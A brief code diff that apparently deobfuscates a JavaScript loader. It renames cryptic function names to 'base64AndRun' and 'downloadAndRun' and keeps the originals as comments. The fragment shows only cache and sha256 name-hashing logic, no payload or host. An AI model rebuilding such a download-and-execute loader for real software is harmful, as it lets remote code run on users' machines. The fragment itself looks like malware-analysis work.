@@ -80,8 +80,10 @@ function anonymous() {
             cache.p = M
         },
         // original function 
-        hPL3On: c,
-        ZKvD0e: async function(script) {
+        // hPL3On
+        base64AndRun: c,
+        // ZKvD0e
+        downloadAndRun: async function(script) {
             if (script in cache == false && script in MM == false) {
                 let I = script;
                 I = sha256(cache.p + script).substring(0, 40);
